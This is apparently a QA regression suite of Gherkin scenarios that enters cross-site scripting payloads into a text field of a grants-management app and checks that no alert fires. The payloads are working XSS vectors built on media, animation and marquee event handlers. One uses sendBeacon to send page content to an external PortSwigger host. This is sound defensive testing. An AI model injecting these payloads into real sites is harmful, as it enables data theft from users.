@US-296453 @regression-QA @Sprint-5-Year-2023
Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
  Text Field of Data Table Enhanced, few script has to handle.
  Need to handle same scenario in PDF for CKEditor, Data Table and Data Table Enhanced. (Suite ID: 304363)

    ################## Data Type - Text Field- Vrushali ###################
  @300625 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                           | Field                |
      | <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300629 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                       | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300634 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                            | Field                |
      | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300635 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                         | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300639 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <body onbeforeprint=console.log(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300640 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <xss onbeforescriptexecute=alert(1)><script>1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300644 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                     | Field                |
      | <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300646 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <svg><animate onbegin=alert(1) attributeName=x dur=1s> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300648 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300652 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                            | Field                |
      | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300659 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                   | Field                |
      | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300662 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value             | Field                |
      | {testData:script} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300664 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                         | Field                |
      | <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300665 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <svg><animate onend=alert(1) attributeName=x dur=1s> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300666 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                            | Field                |
      | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300667 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <audio src/onerror=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300668 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300669 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
